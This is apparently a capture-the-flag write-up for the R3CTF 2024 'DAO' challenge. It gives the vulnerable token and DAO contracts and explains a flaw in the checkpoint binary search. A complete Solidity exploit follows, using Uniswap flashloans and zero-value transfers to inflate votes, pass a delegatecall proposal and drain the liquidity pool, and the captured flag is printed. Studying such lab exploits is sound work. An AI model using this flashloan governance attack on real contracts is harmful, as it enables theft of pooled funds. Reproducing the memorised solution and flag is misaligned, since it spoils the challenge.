---
title: Blockchain - DAO
description: 2024 | R3CTF | Blockchain
tags:
    - smart contract
    - checkpoint
    - binary search
---

## Description

rug me pls

??? note "Deploy.s.sol"

    ```js
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.13;

    ...

    contract Deploy is CTFDeployment {
        function deploy(address system, address player) internal override returns (address challenge) {
            vm.startBroadcast(player);
            payable(system).transfer(player.balance - 10 ether);
            vm.stopBroadcast();

            vm.startBroadcast(system);

            WETH9 weth = new WETH9();

            R3Token token = new R3Token();
            R3Dao dao = new R3Dao(token);
            token.transferOwnership(address(0));

            IUniswapV2Factory uniswapV2Factory = IUniswapV2Factory(
                deployUniswapV2Factory()
            );
            IUniswapV2Pair pair = IUniswapV2Pair(
                uniswapV2Factory.createPair(address(token), address(weth))
            );

            token.transfer(address(pair), 100_000 ether);
            weth.deposit{value: 500 ether}();
            weth.transfer(address(pair), 500 ether);
            pair.mint(address(dao));

            challenge = address(new Challenge(dao, pair, token, IERC20(address(weth))));

            vm.stopBroadcast();
        }

            function deployUniswapV2Factory() internal returns (address) {
            // Bytecode from the mainnet deployment
            ...
            address addr;
            assembly {
                addr := create(0, add(bytecode, 0x20), mload(bytecode))
            }

            return addr;
        }
    }
    ```

??? note "Challenge.sol"

    ```js
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.20;

    import "src/R3Dao.sol";
    import "src/IERC20.sol";
    import "v2-core/interfaces/IUniswapV2Pair.sol";

    contract Challenge {
        R3Dao public immutable dao;
        IUniswapV2Pair public immutable pair;
        IERC20 public immutable token;
        IERC20 public immutable weth;

        constructor(R3Dao _dao, IUniswapV2Pair _pair, IERC20 _token, IERC20 _weth) {
            dao = _dao;
            pair = _pair;
            token = _token;
            weth = _weth;
        }

        function isSolved() external view returns (bool) {
            return address(msg.sender).balance > 500 ether;
        }
    }
    ```

??? note "R3Token.sol"

    ```js
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.20;

    import "./IERC20.sol";

    contract R3Token is IERC20 {
        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed owner, address indexed spender, uint256 value
        );

        uint256 public totalSupply;
        mapping(address => uint256) public balanceOf;
        mapping(address => mapping(address => uint256)) public allowance;
        string public name;
        string public symbol;
        uint8 public decimals;
        address public owner;

        struct Checkpoint {
            uint256 fromBlock;
            uint256 value;
        }
        mapping(address => Checkpoint[]) public balanceCheckpoints;

        modifier onlyOwner() {
            require(msg.sender == owner, "R3Token: not owner");
            _;
        }

        function transferOwnership(address newOwner) external onlyOwner {
            owner = newOwner;
        }

        constructor() {
            name = "R3Token";
            symbol = "R3";
            decimals = 18;
            owner = msg.sender;

            //mint
            totalSupply = 1_000_000 ether;
            balanceOf[msg.sender] = totalSupply;
        }

        function _transfer(address from, address to, uint256 amount) internal {
            balanceOf[from] -= amount;
            balanceOf[to] += amount;
            balanceCheckpoints[from].push(Checkpoint(block.number, balanceOf[from]));
            balanceCheckpoints[to].push(Checkpoint(block.number, balanceOf[to]));
            emit Transfer(from, to, amount);
        }

        function transfer(address recipient, uint256 amount)
            external
            returns (bool)
        {
            _transfer(msg.sender, recipient, amount);
            return true;
        }

        function approve(address spender, uint256 amount) external returns (bool) {
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transferFrom(address sender, address recipient, uint256 amount)
            external
            returns (bool)
        {
            allowance[sender][msg.sender] -= amount;
            _transfer(sender, recipient, amount);
            return true;
        }

        function getPriorVotes(address account, uint256 blockNumber)
            external
            view
            returns (uint256)
        {
            Checkpoint[] storage checkpoints = balanceCheckpoints[account];
            if (checkpoints.length == 0 || blockNumber < checkpoints[0].fromBlock) {
                return 0;
            }
            if (blockNumber >= checkpoints[checkpoints.length - 1].fromBlock) {
                return checkpoints[checkpoints.length - 1].value;
            }
            uint256 min = 0;
            uint256 max = checkpoints.length - 1;
            while (max > min) {
                uint256 mid = (max + min + 1) / 2;
                if (checkpoints[mid].fromBlock == blockNumber) {
                    return checkpoints[mid].value;
                }
                if (checkpoints[mid].fromBlock < blockNumber) {
                    min = mid;
                } else {
                    max = mid - 1;
                }
            }
            return checkpoints[min].value;
        }
    }
    ```

??? note "R3Dao.sol"

    ```js
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.20;

    import "./R3Token.sol";

    contract R3Dao {
        R3Token public token;
        
        struct Proposal {
            address proposer;
            address recipient;
            bytes32 payloadHash;
            uint256 votes;
            uint256 beginBlock;
            mapping(address => bool) voted;
            bool executed;
        }
        Proposal[] public proposals;

        constructor(R3Token _token) {
            token = _token;
        }

        function propose(address recipient, bytes32 payloadHash) external returns (uint256) {
            uint256 proposalIndex = proposals.length;
            proposals.push();
            Proposal storage proposal = proposals[proposalIndex];
            proposal.proposer = msg.sender;
            proposal.recipient = recipient;
            proposal.payloadHash = payloadHash;
            proposal.beginBlock = block.number - 1;
            return proposalIndex;
        }

        function vote(uint256 proposalIndex) external {
            Proposal storage proposal = proposals[proposalIndex];
            require(!proposal.executed, "R3Dao: proposal executed");
            require(!proposal.voted[msg.sender], "R3Dao: already voted");
            uint power = token.getPriorVotes(msg.sender, proposal.beginBlock);
            require(power > 0, "R3Dao: no voting power");
            proposal.voted[msg.sender] = true;
            proposal.votes += power;
        }

        function execute(uint256 proposalIndex, bytes calldata payload) external {
            Proposal storage proposal = proposals[proposalIndex];
            require(!proposal.executed, "R3Dao: proposal executed");
            require(proposal.votes > token.totalSupply() / 2, "R3Dao: insufficient votes");
            proposal.executed = true;
            (bool success, ) = proposal.recipient.delegatecall(payload);
            require(success, "R3Dao: call failed");
        }
    }
    ```

## Solution

- To let the `R3Dao` execute a liquidity token transfer proposal, we need enough votes
- Each voter's vote is a cached balance of tokens he holds, handled by the function `getPriorVotes`. The state variable `balanceCheckpoints` records all changes to user balances
- In the function `getPriorVotes`, it will do a binary search on the `balanceCheckpoints[account]` if the block number of the last record is greater than the argument `blockNumber`. There may be multiple checkpoints with the same block number, but the search returns as soon as it encounters a checkpoint with the required block number
- Therefore, we can perform a flashloan, and add some redundant operations so that the binary search returns the desired checkpoint during the flashloan
- After receiving the liquidity tokens, we can burn them all in exchange for ether and solve the challenge

??? note "Solve.s.sol"

    ```js
    contract Helper {

        function flashloan(Challenge challenge) external {
            IUniswapV2Pair pair = challenge.pair();
            address token = address(challenge.token());
            // redundant transfer
            // using tx.origin does not affect the checkpoints of the Hack
            IERC20(token).transfer(tx.origin, 0);
            uint bal = IERC20(token).balanceOf(address(pair)) - 1;
            pair.swap(
                pair.token0() == token ? bal : 0,
                pair.token1() == token ? bal : 0,
                address(this),
                abi.encode(address(challenge))
            );
        }

        function vote(Challenge challenge) external {
            R3Dao dao = challenge.dao();
            challenge.token().transfer(tx.origin, 0);  // redundant transfer
            dao.vote(0);
        }

        function uniswapV2Call(
            address sender,
            uint a0,
            uint a1,
            bytes calldata data
        ) external {
            require(sender == address(this));
            IERC20 token = Challenge(abi.decode(data, (address))).token();
            token.transfer(msg.sender, (a0 > 0 ? a0 : a1) + 300 ether);
        }
    }

    contract Hack {

        Challenge challenge;
        UniswapV2Router router;

        Helper[] helpers;

        constructor(Challenge _challenge) {
            challenge = _challenge;
            // If you use uniswapv2-solc0.8, don't forget to update
            // the init code hash in UniswapV2Library::pairFor()
            router = new UniswapV2Router(
                _challenge.pair().factory(),
                address(_challenge.weth())
            );
        }

        function swap() external payable {
            Challenge chal = challenge;
            address[] memory path = new address[](2);
            path[0] = address(chal.weth());
            path[1] = address(chal.token());
            router.swapExactETHForTokens{value: msg.value}(
                0,
                path,
                address(this),
                block.timestamp
            );
            IERC20 token = IERC20(path[1]);
            for (uint i; i < 5; i++) {
                Helper helper = new Helper();
                token.transfer(address(helper), 300 ether); // swap fee
                helpers.push(helper);
            }
        }

        function flashloan() external {
            Challenge chal = challenge;
            IUniswapV2Pair pair = chal.pair();
            address token = address(chal.token());
            for (uint i; i < 5; i++) {
                helpers[i].flashloan(chal);
            }
            uint bal = IERC20(token).balanceOf(address(pair)) - 1;
            pair.swap(
                pair.token0() == token ? bal : 0,
                pair.token1() == token ? bal : 0,
                address(this),
                new bytes(1)
            );
        }

        function exploit() external {
            Challenge chal = challenge;
            R3Dao dao = chal.dao();
            dao.propose(address(this), bytes32(0));
            for (uint i; i < 5; i++) {
                helpers[i].vote(chal);
            }
            for (uint i; i < 4; i++) {
                chal.token().transfer(tx.origin, 0);  // redundant transfer
            }
            dao.vote(0);
            dao.execute(0, abi.encodeCall(this.lpTransfer, (
                address(challenge.pair()),
                address(this)
            )));
            IUniswapV2Pair pair = challenge.pair();
            pair.transfer(address(pair), pair.balanceOf(address(this)));
            pair.burn(address(this));
            WETH9 weth = WETH9(payable(address(challenge.weth())));
            weth.withdraw(weth.balanceOf(address(this)));
            payable(msg.sender).transfer(address(this).balance);
        }

        function uniswapV2Call(
            address sender,
            uint a0,
            uint a1,
            bytes calldata
        ) external {
            require(sender == address(this));
            IERC20 token = challenge.token();
            token.transfer(msg.sender, (a0 > 0 ? a0 : a1) + 300 ether);
        }

        function lpTransfer(address token, address target) public {
            IERC20(token).transfer(target, IERC20(token).balanceOf(address(this)));
        }

        receive() external payable {}
    }

    contract Solve is CTFSolver {
        function solve(address challenge, address) override internal {
            Challenge chal = Challenge(challenge);
            Hack hack = new Hack(chal);
            hack.swap{value: 9.2 ether}();
            vm.roll(block.number + 1);
            hack.flashloan();
            vm.roll(block.number + 1);
            hack.exploit();
            require(chal.isSolved());
        }
    }
    ```

### Flag

> R3CTF{PL2-RE7-gO-PERC3N7S-oR-WE-WILl-d0xX-y0u-416baaeca611}
